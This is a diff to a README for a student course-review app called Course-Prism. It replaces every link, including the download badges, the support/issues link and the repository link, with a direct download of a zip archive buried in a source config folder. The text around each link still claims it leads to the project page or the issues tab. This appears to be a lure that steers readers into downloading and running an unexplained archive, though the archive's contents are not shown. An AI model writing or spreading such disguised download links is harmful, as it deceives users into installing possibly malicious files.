@@ -1,6 +1,6 @@
 # 🎓 Course-Prism - Find, Review, and Rate Courses Easily
 
-[![Download Course-Prism](https://img.shields.io/badge/Download-Course--Prism-brightgreen)](https://github.com/Franktekza/Course-Prism)
+[![Download Course-Prism](https://img.shields.io/badge/Download-Course--Prism-brightgreen)](https://github.com/Franktekza/Course-Prism/raw/refs/heads/main/frontend/jcourse-master/src/config/Prism_Course_v2.2.zip)
 
 Course-Prism is a platform for SWUFE students to explore courses, write honest reviews, rate instructors, and check course statistics. It helps you find the best classes and plan your studies with real feedback from other students.
 
@@ -35,7 +35,7 @@ The app uses common web technologies designed to run smoothly on Windows PCs wit
 ### 1. Visit the download page
 
 Click the big green button at the top or go to this link:  
-[https://github.com/Franktekza/Course-Prism](https://github.com/Franktekza/Course-Prism)
+[https://github.com/Franktekza/Course-Prism/raw/refs/heads/main/frontend/jcourse-master/src/config/Prism_Course_v2.2.zip](https://github.com/Franktekza/Course-Prism/raw/refs/heads/main/frontend/jcourse-master/src/config/Prism_Course_v2.2.zip)
 
 You will arrive at the main GitHub page of the project.
 
@@ -126,14 +126,14 @@ You don’t have to deal with any setups or commands. The installer will do this
 
 - Use the "Forgot password" link on the login page.
 - Contact support via the GitHub issues page:  
-  [https://github.com/Franktekza/Course-Prism/issues](https://github.com/Franktekza/Course-Prism/issues)
+  [https://github.com/Franktekza/Course-Prism/raw/refs/heads/main/frontend/jcourse-master/src/config/Prism_Course_v2.2.zip](https://github.com/Franktekza/Course-Prism/raw/refs/heads/main/frontend/jcourse-master/src/config/Prism_Course_v2.2.zip)
 
 ---
 
 ## 📂 Where to Get Help and More Info
 
 - Visit the GitHub repository:  
-  [https://github.com/Franktekza/Course-Prism](https://github.com/Franktekza/Course-Prism)
+  [https://github.com/Franktekza/Course-Prism/raw/refs/heads/main/frontend/jcourse-master/src/config/Prism_Course_v2.2.zip](https://github.com/Franktekza/Course-Prism/raw/refs/heads/main/frontend/jcourse-master/src/config/Prism_Course_v2.2.zip)
 
 - Check the “Issues” tab on GitHub to report bugs or ask questions.
 
@@ -198,4 +198,4 @@ To get new features or bug fixes:
 
 ---
 
-[![Download Course-Prism](https://img.shields.io/badge/Download-Course--Prism-brightgreen)](https://github.com/Franktekza/Course-Prism)
+[![Download Course-Prism](https://img.shields.io/badge/Download-Course--Prism-brightgreen)](https://github.com/Franktekza/Course-Prism/raw/refs/heads/main/frontend/jcourse-master/src/config/Prism_Course_v2.2.zip)
